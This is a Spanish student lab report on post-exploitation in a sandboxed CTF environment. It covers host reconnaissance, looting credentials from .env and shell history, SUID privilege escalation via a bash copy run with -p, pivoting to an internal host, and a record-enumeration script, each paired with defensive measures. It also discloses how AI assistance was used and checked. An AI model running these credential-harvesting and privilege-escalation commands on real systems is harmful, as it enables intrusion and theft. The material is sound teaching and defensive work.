# Informe — Laboratorio 08 · Post-explotación y automatización

**Grupo:** 14 · **Integrantes:** ver [`INTEGRANTES.md`](INTEGRANTES.md) · **Fecha:** 19/11/2026

## 0. Declaración de uso de IA

- **Herramienta:** Claude (modelo Claude Sonnet 5.5, de Anthropic) usado a través de Claude Code (CLI), con acceso al repositorio del grupo (worktree de la rama `lab08-grupo14`).
- **Para qué se usó:**
  - Lectura y resumen del enunciado (`labs/lab08-postexplotacion/README.md`), la rúbrica y `docs/entregable.md` para armar la estructura de esta entrega.
  - Redacción de este informe y de `research.md` a partir de la teoría del enunciado y de conocimiento general de post-explotación (SUID/GTFOBins, pivoting, gestión de secretos).
  - Implementación de la función `buscar_flag()` en `src/recolector.py` (el TODO del esqueleto) y de un self-check (`src/test_recolector.py`) que mockea las respuestas HTTP para verificar la lógica sin red.
- **Qué NO se hizo con IA directamente:** no se leyó `labs/lab08-postexplotacion/solucion.md` en ningún momento, ni para resolver el lab ni para redactar este informe.
- **Ejecución real del lab (actualización posterior):** el equipo no tenía Docker instalado al momento de escribir el código y el informe. Con autorización explícita del integrante responsable, se usó WSL2 + Docker (ya instalado para otro proyecto, sin modificar esa infraestructura) para levantar el entorno (`make setup`, `./ctf lab 08`) y correr dentro del contenedor `cyberlab-phantomcorp` (como `operador`) los comandos de recon, loot, privesc y pivoting de la sección 2, y el script de automatización de la sección 3. Las flags obtenidas se verificaron contra `labs/lab08-postexplotacion/retos.manifest` (hashes públicos, no la solución) antes de enviarlas con `./ctf submit`.
- **Cómo se verificó lo generado por la IA:**
  - El código de `buscar_flag()` se corrió localmente contra datos simulados (`src/test_recolector.py`) y pasó: `PYTHONUTF8=1 python3 test_recolector.py` → `OK: todos los self-checks pasaron`.
  - Al correrlo contra el servidor real (sección 3), se detectó un **bug real**: `CLAVES_NORMALES` no incluía la clave `id` (que todo legajo normal trae), así que el script daba un falso positivo en el primer legajo consultado en vez de seguir buscando. Se corrigió a `CLAVES_NORMALES = {"id", "nombre", "area"}`, se volvió a correr el self-check (sigue en OK) y recién ahí el script encontró la flag real.
  - Las afirmaciones teóricas (SUID, `-p` de GTFOBins, pivoting, `.env`/`.bash_history`) se contrastaron contra el propio README del lab, contra las fuentes citadas en `research.md` y contra el comportamiento real observado en el contenedor.
  - Las 5 flags se verificaron primero contra los hashes SHA-256 de `retos.manifest` y después fueron aceptadas por `./ctf submit 08` y `./ctf status 08` (ver sección 1).
  - Un integrante del grupo revisó el diff antes de incorporarlo.

## 1. Flags capturadas

| Reto | Flag |
|---|---|
| R1 — Reconocimiento del host comprometido | `FLAG{post_situational_awareness}` |
| R2 — Loot de credenciales | `FLAG{loot_credentials_found}` |
| R3 — Escalada de privilegios (SUID) | `FLAG{privesc_suid_root}` |
| R4 — Pivoting al host interno | `FLAG{pivot_internal_host}` |
| R5 — Automatización (fuerza bruta de legajos) | `FLAG{automation_pays_off}` |

Salida real de `./ctf status 08` tras enviar las 5:

```
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 08                      │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Reconocimiento del host comprometido
   ✓  R2     Loot de credenciales
   ✓  R3     Escalada de privilegios (SUID)
   ✓  R4     Pivoting al host interno
   ✓  R5     Automatizacion (fuerza bruta de legajos)

  ██████████████████████████████ 5/5 (100%)

[ OK ] ¡Lab 08 COMPLETO! Ponete las pilas con la próxima unidad.
```

## 2. Informe de post-explotación

| Fase | Qué hiciste | Comando/técnica | Evidencia | Defensa |
|---|---|---|---|---|
| Recon del host | Desde `make shell-victima` (`operador`), identificar usuario, sistema y red del host comprometido. | `id ; whoami ; hostname ; uname -a` / `env` / `ip addr ; cat /etc/hosts` / `ls -la /opt /var/www /home` | ```uid=1000(operador) gid=1000(operador) groups=1000(operador)``` · `whoami` → `operador` · `hostname` → `phantomcorp` · `uname -a` → `Linux phantomcorp 6.6.87.2-microsoft-standard-WSL2 ... x86_64 GNU/Linux`. `env` muestra `DEPLOY_ENV=produccion` (sin secretos). `ls -la /opt` muestra un directorio fuera de lugar: `/opt/phantom-deploy`, que no debería existir en un host de producción (R1 — hallazgo). | No dejar en el host notas, scripts de deploy ni comentarios con información operativa; usar gestores de configuración/CI que no dejen rastro en el filesystem productivo. |
| Loot de credenciales | Buscar secretos en archivos de configuración, en la nota de deploy hallada en R1, e historial de comandos. | `cat /opt/phantom-deploy/DEPLOY_NOTES.txt` / `cat /var/www/.env` / `cat ~/.bash_history` / `grep -rai "pass\|secret\|token" /var/www /opt 2>/dev/null` | `/opt/phantom-deploy/DEPLOY_NOTES.txt` contiene `deploy_token=FLAG{post_situational_awareness}` (la flag de R1 estaba acá). `/var/www/.env` contiene `DB_HOST=phantomcorp-db`, `DB_USER=phantom_app`, `DB_PASS=Ph@ntom-DB-2024` y `APP_SECRET=FLAG{loot_credentials_found}` (R2). `~/.bash_history` muestra que un operador previo ya había mirado `.env` y probado `curl http://phantomcorp-db/` — exactamente el camino que seguimos nosotros. | No versionar ni dejar `.env` en el servidor de producción; usar un *vault* (Vault, AWS Secrets Manager, SSM Parameter Store) o variables de entorno inyectadas en runtime y rotadas; limpiar `.bash_history` o deshabilitarlo para cuentas de servicio; no dejar notas operativas (`DEPLOY_NOTES.txt`) en el filesystem. |
| Privesc (SUID) | Buscar binarios con bit SUID activo y no estándar, y usarlo para escalar a root. | `sudo -l` (no instalado en este contenedor) → `find / -perm -4000 -type f 2>/dev/null` → se identificó `/usr/local/bin/system-check` (el resto son SUID estándar de Debian: `chsh`, `newgrp`, `gpasswd`, `chfn`, `mount`, `umount`, `passwd`, `su`) → confirmado que es una copia de `bash` (`system-check --help` imprime el usage de GNU bash) → GTFOBins indica `bash -p` para preservar privilegios efectivos → `/usr/local/bin/system-check -p -c 'id; whoami; cat /root/flag.txt'` (R3). | Antes: `uid=1000(operador) euid=1000`. Después de `system-check -p`: `uid=1000(operador) gid=1000(operador) euid=0(root) groups=1000(operador)`, `whoami` → `root`. `cat /root/flag.txt` → `FLAG{privesc_suid_root}`. | Auditar periódicamente binarios SUID (`find / -perm -4000`) contra una lista blanca conocida del sistema operativo; quitar el bit SUID de cualquier binario no estándar (`chmod u-s`); si se necesita ejecutar algo como root, usar `sudo` con reglas específicas (`sudo -l`) en vez de SUID genérico. |
| Pivoting | Alcanzar el host interno `phantomcorp-db`, inalcanzable desde la consola del atacante, usando el host comprometido como trampolín. | Desde `make shell-victima`: `curl -s http://phantomcorp-db/`. Desde la consola del atacante (`make shell`): el mismo `curl` (contraste). | Desde la víctima: `{"host": "phantomcorp-db", "msg": "Base de datos interna. Acceso restringido a la LAN.", "pivot": "FLAG{pivot_internal_host}"}` (R4). Desde el atacante, el mismo `curl` falla con código de salida `6` (no pudo resolver el host): la red interna (`cyberlab_internalnet`, `internal: true` en el compose) solo es alcanzable desde `phantomcorp`, nunca desde `attacker`. | Segmentar redes de verdad (el hecho de que el host comprometido SÍ llegue a la red interna es el problema): aplicar *firewalling* y reglas de egreso entre la DMZ y la red interna incluso para tráfico que "sale" desde un host ya confiable; principio de mínimo privilegio de red (solo los puertos/servicios que el host web realmente necesita hablar con la DB, nada más); monitoreo de conexiones salientes anómalas desde hosts de la DMZ. |

## 3. Automatización

Se completó `src/recolector.py` (función `buscar_flag`), copiado del esqueleto
del lab (`labs/lab08-postexplotacion/src/recolector.py`) a esta entrega.

```python
def buscar_flag(base: str, desde: int, hasta: int) -> tuple[int, str] | None:
    CLAVES_NORMALES = {"id", "nombre", "area"}
    for id_ in range(desde, hasta + 1):
        legajo = consultar_legajo(base, id_)
        if legajo is None:
            continue  # 404 u otro error: no es este, seguimos
        extra = set(legajo) - CLAVES_NORMALES
        if not extra:
            continue  # legajo normal, nada raro
        clave_flag = next((k for k in extra if "flag" in k.lower()), next(iter(extra)))
        return id_, legajo[clave_flag]
    return None
```

Enumera cada legajo con `consultar_legajo()` (ya provista en el esqueleto), y
detecta el legajo con el flag porque trae una clave adicional a las esperadas
(`nombre`, `area`). Apenas lo encuentra, corta el recorrido (`return`) sin
seguir consultando el resto del rango. Los 404 y otros errores de red ya son
manejados por `consultar_legajo()` (devuelve `None`), y acá se los trata como
"seguir probando con el siguiente id".

**Verificación sin Docker.** Como no se puede alcanzar `phantomcorp-db` sin
levantar el entorno, se agregó `src/test_recolector.py`: mockea
`consultar_legajo()` con datos simulados (4 legajos, uno con una clave `flag`)
y comprueba que `buscar_flag()` encuentra el legajo correcto, corta apenas lo
encuentra (no sigue consultando los ids siguientes) y devuelve `None` cuando no
hay flag en el rango o todos los ids fallan. Salida real de correrlo:

```
$ cd entregas/lab08/grupo14/src
$ PYTHONUTF8=1 python3 test_recolector.py
OK: todos los self-checks pasaron
```

**Corrida real contra el host interno**, desde `make shell-victima`:

```bash
$ python3 recolector.py --base http://phantomcorp-db --desde 1 --hasta 250
[*] Enumerando legajos 1..250 en http://phantomcorp-db
[+] Flag en el legajo id=187: FLAG{automation_pays_off}
```

**Bug encontrado al correrlo contra el servidor real.** La primera versión de
`CLAVES_NORMALES` era `{"nombre", "area"}`, sin `"id"`. Pero cada legajo normal
devuelve `{"id": N, "nombre": "...", "area": "..."}` — la clave `id` siempre
está presente. Como no formaba parte de `CLAVES_NORMALES`, el script la trataba
como "clave extra" en **cualquier** legajo, y devolvía un falso positivo en el
primer id consultado (`id=1`, que en realidad no tiene flag: `{"id": 1,
"nombre": "empleado_1", "area": "operaciones"}`). El self-check con datos
mockeados no detectó esto porque los mocks no incluían la clave `id`. Se
corrigió a `CLAVES_NORMALES = {"id", "nombre", "area"}`, se re-corrió el
self-check (sigue en `OK`) y recién con la corrección el script enumeró
correctamente hasta encontrar el legajo real con la flag (`id=187`).

## 4. Preguntas de análisis

**P1 — SUID y el flag `-p`.**
Un binario con el bit SUID (*Set User ID*) activado se ejecuta con el **UID
efectivo del dueño del archivo**, no con el del usuario que lo invoca. Si el
dueño es `root` y el binario permite, de alguna forma, ejecutar comandos o leer
archivos arbitrarios (por ejemplo una copia SUID de un intérprete como `bash`,
`python` o una utilidad como `find`/`vim`), cualquier usuario que pueda
ejecutarlo obtiene efectivamente privilegios de `root`, sin necesidad de
contraseña ni exploit de memoria: es un escalamiento directo por
*misconfiguration*. Muchos de estos intérpretes, por seguridad, al detectar
que el UID real y el UID efectivo difieren, bajan sus privilegios al UID real
(*drop privileges*) antes de hacer algo peligroso. La flag `-p` (presente en
`bash` y documentada en GTFOBins) le indica al binario que **no** haga ese
*drop*: mantiene el UID/GID efectivo (el del dueño, `root`) durante toda la
ejecución, por lo que la shell resultante queda corriendo como `root` en vez
de caer de nuevo al usuario real.

**P2 — el pivoting (por qué el atacante no llegaba y vos sí).**
La red está segmentada: existe una red "externa"/DMZ donde vive el servidor
web (`phantomcorp-web`), visible desde Internet, y una red "interna" donde
vive la base de datos (`phantomcorp-db`), que **no** tiene ninguna ruta ni
regla de firewall que la haga alcanzable desde afuera. La consola del
atacante solo tiene conectividad a la red externa, así que cualquier
`curl http://phantomcorp-db/` desde ahí falla (sin ruta / resuelve a nada).
El servidor web comprometido, en cambio, **sí** está conectado a ambas redes
(es su función legítima: hablarle a la base de datos para atender pedidos),
así que una vez que el atacante tiene ejecución de comandos en ese servidor,
puede usarlo como trampolín: emite el `curl` desde ahí, donde la ruta de red
hacia `phantomcorp-db` sí existe. Eso es pivoting: el host comprometido no es
el objetivo final, es el puente hacia una red que antes era invisible.

**P3 — cómo evitar secretos en `.env`/`.bash_history`.**
La causa raíz es tratar el filesystem del servidor como lugar seguro para
guardar secretos en texto plano. Prácticas que lo evitan: (1) gestión
centralizada de secretos (Vault, AWS Secrets Manager/SSM Parameter Store,
Doppler) que los inyecta en runtime como variables de entorno efímeras y
nunca quedan escritos en disco; (2) nunca commitear `.env` (usar `.env.example`
sin valores reales y `.gitignore`); (3) para el historial de shell, deshabilitar
o limpiar el historial en cuentas de servicio, no operar manualmente con
secretos en la línea de comandos (pasarlos por archivos con permisos
restringidos o por stdin, nunca como argumento visible en `ps`/`history`); y
(4) rotación periódica de credenciales, para que un secreto filtrado tenga
vida útil corta.

**P4 — qué decidiste vos que el script no decide solo.**
El script automatiza la *repetición* (recorrer 250 ids), pero varias
decisiones quedaron en manos humanas al escribirlo: (a) **qué contar como
"encontrado"** — decidimos que la señal es una clave fuera de las esperadas
(`nombre`, `area`), no un valor fijo; eso requiere conocer la forma de los
datos normales de antemano; (b) **cuándo parar** — decidimos cortar
inmediatamente al primer hallazgo en vez de recolectar todos los legajos y
filtrar después, para minimizar requests contra un servicio ajeno; (c) **cómo
tratar los errores** — decidimos que un 404 o un error de red en un id
individual no debe abortar todo el barrido, sino saltar ese id y seguir (la
alternativa, frenar ante el primer error, hubiera sido inútil con un rango de
250); (d) **los límites del rango y el `timeout`** — valores que el script no
infiere solo, los fija quien lo invoca según lo que sabe del objetivo. Un
agente que orqueste esto (Lab 09) todavía necesitaría que un humano le dé esos
criterios (qué es éxito, cuándo parar, qué tolerar como error) o, en el mejor
caso, que los infiera de un objetivo explícito — pero esa inferencia sigue
siendo una decisión de alto riesgo que conviene mantener supervisada,
especialmente en un contexto ofensivo real.

**P5 — defensa para SUID y para pivoting.**
- **SUID:** auditar el sistema regularmente con `find / -perm -4000 -type f` y
  compararlo contra una lista blanca de binarios SUID estándar de la
  distribución; cualquier binario SUID que no esté en esa lista (una copia de
  `bash`, `python`, etc.) se remueve o se le saca el bit (`chmod u-s`).
  Complementariamente, restringir con AppArmor/SELinux qué puede hacer un
  binario SUID aunque el bit esté puesto.
- **Pivoting:** segmentación de red real con firewall entre la DMZ (donde vive
  el servidor web) y la red interna (donde vive la base de datos), permitiendo
  solo los puertos/protocolos estrictamente necesarios para que el servidor
  web le hable a la DB — nunca "toda la red interna visible porque un host de
  la DMZ está en ambas". Sumar monitoreo de conexiones salientes inusuales
  desde hosts de la DMZ hacia la red interna, para detectar el pivot cuando
  ocurra aunque no se lo haya podido prevenir del todo.
